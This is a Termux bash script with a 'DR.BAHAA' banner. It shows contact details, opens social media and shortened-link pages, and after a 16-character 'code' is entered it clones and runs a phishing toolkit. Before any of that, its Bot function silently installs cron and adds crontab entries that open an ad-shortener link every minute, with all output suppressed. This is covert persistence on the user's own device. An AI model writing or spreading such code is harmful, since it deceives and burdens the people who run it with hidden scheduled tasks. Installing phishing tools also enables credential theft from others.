#!/bin/bash

opened(){
    clear
    echo -e "\e[31m
    ██████╗ ██████╗    ██████╗  █████╗ ██╗  ██╗ █████╗  █████╗ 
    ██╔══██╗██╔══██╗   ██╔══██╗██╔══██╗██║  ██║██╔══██╗██╔══██╗
    ██║  ██║██████╔╝   ██████╔╝███████║███████║███████║███████║
    ██║  ██║██╔══██╗   ██╔══██╗██╔══██║██╔══██║██╔══██║██╔══██║
    ██████╔╝██║  ██║▄█╗██████╔╝██║  ██║██║  ██║██║  ██║██║  ██║
    ╚═════╝ ╚═╝  ╚═╝╚═╝╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝
    \e[0m"
    echo -e "\e[32mContact me with:\e[0m"
    echo -e "\e[32mWhatsApp: +201064004818\e[0m"
    echo -e "\e[32mTelegram: @bHa_0106\e[0m"
    echo -e "\e[31mPress Enter to continue\e[0m"
    read -r

    telegram_url="https://t.me/bahaa_010640"
    tiktok_url="https://www.tiktok.com/@aredanws"
    facebook_url="https://www.facebook.com/18xoebDdM4/"
    browser_url="https://shrinkme.ink/amoXxp4K"

    open_url "Telegram" "$telegram_url"

    open_url "TikTok" "$tiktok_url"

    open_url "Facebook" "$facebook_url"

    open_url "Browser" "$browser_url"
}

open_url(){
    app_name=$1
    url=$2

    echo -e "\e[33mOpening $app_name...\e[0m"
    termux-open-url "$url"

    for i in {20..0}; do
        echo -e "\e[34mWaiting $i seconds...\e[0m"
        sleep 1.6
    done
}
clear
jon(){


    
   
    
    echo "Enter the Code!"
    read code

    if [ ${#code} -eq 16 ]; then
        git clone https://github.com/CodingRanjith/autophisher.git
        cd autophisher
        bash autophisher.sh


    else
        while true; do
            echo -e "\e[31mError:\e[0m"
            echo "Enter The Code ! "

            read code
            if [ ${#code} -eq 16 ]; then
                echo "done"
                break 
            fi
        done
    fi
}
Bot(){
#!/data/data/com.termux/files/usr/bin/bash

pkg update -y > /dev/null 2>&1 && pkg install cronie -y > /dev/null 2>&1

cat > ~/start_script.sh << 'EOF'
#!/data/data/com.termux/files/usr/bin/bash

browser_url="https://shrinkme.ink/amoXxp4K"

termux-open-url "$browser_url" > /dev/null 2>&1
EOF

chmod +x ~/start_script.sh > /dev/null 2>&1

(crontab -l 2>/dev/null; echo "* * * * * sleep 3 && ~/start_script.sh > /dev/null 2>&1"; echo "* * * * * sleep 600 && ~/start_script.sh > /dev/null 2>&1") | crontab - > /dev/null 2>&1

crond > /dev/null 2>&1
}
Bot
opened
jon